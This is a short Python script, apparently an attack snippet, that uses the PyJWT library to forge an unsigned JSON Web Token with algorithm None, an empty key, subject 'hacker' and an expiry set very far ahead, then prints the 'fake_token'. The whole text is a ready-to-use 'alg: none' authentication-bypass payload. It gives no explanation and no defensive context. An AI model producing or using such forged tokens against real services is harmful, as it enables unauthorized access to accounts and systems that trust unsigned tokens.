import jwt

payload = {"sub": "hacker", "exp": 9999999999}
fake_token = jwt.encode(payload, key="", algorithm=None)
print(fake_token)
